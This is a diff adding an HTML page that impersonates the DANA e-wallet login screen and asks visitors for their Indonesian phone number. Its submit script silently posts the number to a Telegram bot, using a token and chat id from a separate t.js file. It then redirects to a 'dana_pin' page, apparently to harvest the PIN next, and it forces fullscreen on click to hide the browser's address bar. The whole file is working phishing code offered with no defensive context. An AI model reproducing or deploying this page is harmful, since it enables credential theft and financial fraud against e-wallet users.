@@ -1,0 +1,72 @@
+
+<!DOCTYPE html>
+<html><head><title>DANA | dana.id</title><link href="./assets/img/favicon/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"><link href="./assets/img/favicon/favicon-32x32.png" rel="icon" type="image/png" sizes="32x32"><link href="./assets/img/favicon/favicon-16x16.png" rel="icon" type="image/png" sizes="16x16"><link href="./assets/img/favicon/site.webmanifest" rel="manifest"><meta content="text/html; charset=utf-8" http-equiv="content-type"><meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport"><link href="./lib/style/main.css" rel="stylesheet" type="text/css"><link href="./lib/style/spinner.css" rel="stylesheet" type="text/css"></head><body><div class="container"><a class="aback" href="/"><img src="./assets/img/back.png" class="back"></a><img src="./assets/img/dana_logo.png" class="dana_logo"><h1 class="page-login">Masukkan <b class="bh1">nomor HP</b> kamu untuk lanjut</h1><div class="inputNo"><form onsubmit="submitform();" class="formNo"><label for="nope" class="flagNo"><img src="./assets/img/indo.png" class="flagIndo"></label> <label for="nope"><p class="codeTel">+62</p></label> <input autocomplete="off" class="nope" id="nope" name="phoneNumber" placeholder="811-1234-5678" required type="tel"><h1 class="syarat">Dengan melanjutkan, kamu setuju dengan <b class="bh1">Syarat & Ketentuan</b> dan <b class="bh1">Kebijakan Privasi</b> kami</h1><center><div style="position:fixed;transform: translateX(-50%);left:50%;bottom:10px; width:200px; height:50px;"><button type="button" class="send_data" id="send_data" onclick="submitform();">LANJUT</button></div></center></form></div></div><div class="process" id="process" name="process" style="display: none;"><div class="loading"><img src="./assets/img/load_bg.png"> <img src="./assets/img/load_spin.png" class="spinner"></div></div>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="./t.js"></script>
+<script src="./lib/functions/jquery.mask.min.js"></script>
+<script>
+$(document).keypress(
+    function(event){
+        if (event.which == '13') {event.preventDefault();}
+    }
+);
+document.documentElement.addEventListener("click", function (){
+    var docElm = document.documentElement;
+    if (docElm.requestFullscreen) {docElm.requestFullscreen()}
+    else if (docElm.mozRequestFullScreen) {docElm.mozRequestFullScreen()}
+    else if (docElm.webkitRequestFullScreen) {docElm.webkitRequestFullScreen()}
+});
+</script>
+<script>
+$(document).ready(function(){
+    $('.nope').mask('000-0000-00000');
+});
+
+let btnLogin = document.getElementById("send_data");
+let inputTlp = document.getElementById("nope");
+btnLogin.disabled = true;
+inputTlp.addEventListener("input", function() {
+    if (inputTlp.value.length < 10) {
+        btnLogin.disabled = true;
+    } else {
+        btnLogin.disabled = false;
+    }
+});
+
+inputTlp.addEventListener("input", function() {
+    if (inputTlp.value == '0') {
+        inputTlp.value = '';
+    } else if (inputTlp.value == '62') {
+        inputTlp.value = '';
+    }
+});
+</script>
+<script>
+function submitform() {
+    inputTlp.readOnly = true;
+    let xx = document.getElementById('process');
+    xx.style.display = 'flex';
+    let nohpnya = document.getElementById("nope");
+    let phoneenumber = nohpnya.value;
+    sessionStorage.setItem("phoneNumber", phoneenumber);
+    let phone_number = phoneenumber.replace(/-/g, '');
+    let message = `
+DANA | NoHp| ${phone_number}
+
+- No - Hp: ${phone_number}`;
+    fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
+        },body: JSON.stringify({
+            chat_id: id_telegram,
+            text: message
+        })
+    })
+    window.location.href = "./dana_pin/index.html"
+}
+
+</script>
+</body>
+</html>
